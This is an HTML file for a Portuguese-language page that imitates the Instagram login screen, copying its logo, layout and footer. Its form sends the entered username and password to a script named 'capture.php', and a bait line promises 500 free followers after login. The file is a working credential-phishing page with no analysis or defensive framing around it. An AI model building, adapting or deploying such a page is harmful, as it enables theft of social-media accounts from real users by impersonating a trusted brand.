<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100%;
        }

        .login-container {
            width: 350px;
            padding: 40px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            text-align: center;
            box-shadow: 0 0 5px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }

        .login-container img {
            width: 175px;
            margin-bottom: 20px;
        }

        .login-container form {
            display: flex;
            flex-direction: column;
        }

        .login-container input[type="text"],
        .login-container input[type="password"] {
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            outline: none;
            background-color: #fafafa;
            font-size: 14px;
        }

        .login-container input[type="submit"] {
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 4px;
            background-color: #3897f0;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }

        .login-container .forgot-password {
            text-align: right;
            font-size: 12px;
            color: #00376b;
            margin-top: 10px;
        }

        .login-container .forgot-password a {
            color: #00376b;
            text-decoration: none;
        }

        .login-container .or {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
            margin: 10px 0;
        }

        .login-container .or div {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .login-container .or span {
            margin: 0 18px;
        }

        .login-container .facebook-login a {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin-top: 10px;
            text-decoration: none;
        }

        .login-container .signup-link {
            color: #262626;
            margin-top: 10px;
            font-size: 14px;
        }

        .login-container .signup-link a {
            color: #3897f0;
            text-decoration: none;
        }

        .login-container .free-followers {
            margin-top: 20px;
            color: #262626;
            font-size: 14px;
            font-weight: bold;
        }

        .footer {
            font-size: 12px;
            color: #999;
            text-align: center;
            margin-top: 20px;
        }

        @media (max-width: 800px) {
            .container {
                flex-direction: column;
                align-items: center;
            }

            .login-container {
                margin-top: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
            <form action="capture.php" method="post">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="submit" value="Login">
            </form>
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
            <div class="or">
                <div></div>
                <span>OR</span>
                <div></div>
            </div>
            <div class="facebook-login">
                <a href="https://m.facebook.com/" target="_blank">Login with Facebook</a>
            </div>
            <div class="signup-link">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            <div class="free-followers">
                Ganhe 500 seguidores grátis após o login!
            </div>
        </div>
        <div class="footer">
            <p>&copy; 2024 Instagram from Meta</p>
        </div>
    </div>
</body>
</html>
